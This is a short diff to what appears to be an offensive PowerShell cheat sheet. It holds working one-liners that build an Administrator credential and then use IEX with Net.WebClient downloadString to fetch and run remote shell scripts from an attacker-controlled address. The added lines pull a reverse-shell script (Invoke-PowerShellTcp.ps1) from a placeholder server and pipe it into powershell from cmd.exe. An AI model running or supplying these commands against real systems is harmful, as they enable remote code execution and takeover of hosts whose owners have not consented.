@@ -44,3 +44,5 @@ $credential = New-Object System.Management.Automation.PSCredential('Administrato
 #Then execute with elevated/targeted privileges:
 Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.45/someshell.ps1')" -Credential $credential 
 
+#Interesting way to run powershell IEX from cmd.exe via STDIN:
+echo IEX(New-Object Net.WebClient).downloadString('http://MY.SER.VER.IP:8080/Invoke-PowerShellTcp.ps1') |powershell -noprofile - 
